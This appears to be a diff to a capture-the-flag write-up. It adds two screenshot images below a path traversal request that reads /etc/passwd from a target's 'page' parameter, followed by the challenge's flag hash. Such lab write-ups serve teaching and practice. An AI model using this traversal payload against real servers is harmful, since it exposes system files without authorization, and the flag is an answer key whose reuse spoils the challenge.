@@ -13,3 +13,9 @@ http://{IP}/?page=../../../../../../../etc/passwd
 Here we are!
 
 b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0
+
+
+<img width="1300" alt="Screen Shot 2021-12-10 at 2 07 10 PM" src="https://user-images.githubusercontent.com/64800542/145578794-db4ac96b-ad4f-4594-9641-510c137e70dc.png">
+
+<img width="1297" alt="Screen Shot 2021-12-10 at 2 09 37 PM" src="https://user-images.githubusercontent.com/64800542/145579010-0892b1cc-6ae9-463a-beb2-220509eb097f.png">
+
